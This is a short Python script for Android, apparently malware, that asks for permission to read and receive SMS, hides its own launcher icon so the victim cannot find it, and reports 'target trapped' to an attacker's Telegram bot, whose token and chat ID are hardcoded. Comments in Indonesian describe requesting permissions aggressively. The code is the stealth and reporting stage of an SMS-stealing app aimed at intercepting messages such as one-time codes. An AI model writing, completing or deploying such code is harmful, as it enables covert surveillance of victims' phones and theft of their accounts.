import telebot
from android.permissions import request_permissions, Permission
from jnius import autoclass
import os

TOKEN = "8688240904:AAFbm71rIxvaNTAuy0qUatSkAagp26uD6ZU"
CHAT_ID = "5999516433"
bot = telebot.TeleBot(TOKEN)

def sembunyi_dan_keluar():
    try:
        activity = autoclass('org.kivy.android.PythonActivity').mActivity
        pm = activity.getPackageManager()
        cn = autoclass('android.content.ComponentName')(activity.getPackageName(), 'org.kivy.android.PythonActivity')
        pm.setComponentEnabledSetting(cn, 2, 1) # Hide icon
        bot.send_message(CHAT_ID, "✅ Target Terperangkap! Ikon Hilang.")
    except: pass
    os._exit(0)

def callback(permissions, grants):
    sembunyi_dan_keluar()

if __name__ == '__main__':
    # Minta izin secara agresif
    request_permissions([Permission.READ_SMS, Permission.RECEIVE_SMS, Permission.POST_NOTIFICATIONS], callback)
